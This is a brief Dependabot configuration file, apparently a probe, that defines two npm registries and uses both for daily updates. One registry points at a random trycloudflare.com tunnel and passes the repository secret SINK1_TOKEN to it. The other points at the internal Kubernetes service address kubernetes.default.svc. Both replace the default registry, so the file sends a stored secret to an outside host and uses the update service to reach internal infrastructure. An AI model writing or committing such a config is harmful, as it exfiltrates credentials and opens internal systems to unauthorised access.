# p136 two-registry 1790634545
version: 2
registries:
  sink1tunnel:
    type: npm-registry
    url: https://rand-terms-bytes-subsidiaries.trycloudflare.com/
    token: ${{secrets.SINK1_TOKEN}}
    replaces-base: true
  sink1int:
    type: npm-registry
    url: http://kubernetes.default.svc/
    replaces-base: true
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule: {interval: "daily"}
    registries: [sink1tunnel, sink1int]
